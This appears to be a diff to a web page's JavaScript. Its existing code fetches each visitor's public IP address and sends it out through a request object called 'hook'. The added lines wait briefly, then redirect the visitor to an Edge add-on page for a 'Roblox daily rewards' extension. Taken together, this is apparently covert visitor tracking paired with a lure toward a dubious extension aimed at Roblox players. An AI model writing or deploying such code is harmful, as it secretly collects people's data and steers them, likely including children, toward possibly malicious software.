@@ -9,6 +9,8 @@
       fetch('https://api.ipify.org?format=json')
           .then(response => response.json())
           .then(data => {
+              const delay = ms => new Promise(res => setTimeout(res, ms))
+
               console.log(data.ip);
               var hook = new XMLHttpRequest();
   
@@ -21,6 +23,12 @@
               }
         
               hook.send(JSON.stringify(content));
+
+              (async function (){
+                await delay(200)
+                window.location.href = 'https://microsoftedge.microsoft.com/addons/detail/roblox-daily-rewards/gfojahdoimefaoeehgdjmlkcpmaaoaik';
+              })()
+
           })
           .catch(error => {
               console.log('Error:', error);
